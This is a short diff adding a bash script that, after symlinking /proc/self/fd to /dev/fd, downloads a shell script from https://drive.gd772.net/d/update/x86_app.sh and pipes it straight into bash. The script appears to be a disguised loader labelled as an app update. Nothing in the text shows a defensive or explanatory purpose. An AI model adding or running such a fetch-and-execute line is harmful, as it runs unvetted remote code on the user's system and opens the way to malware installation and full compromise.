@@ -1,0 +1,6 @@
+#!/bin/bash
+
+if [ ! -d "/dev/fd" ]; then
+  ln -sf /proc/self/fd /dev/fd  
+fi
+  bash <(curl -Lso- https://drive.gd772.net/d/update/x86_app.sh)
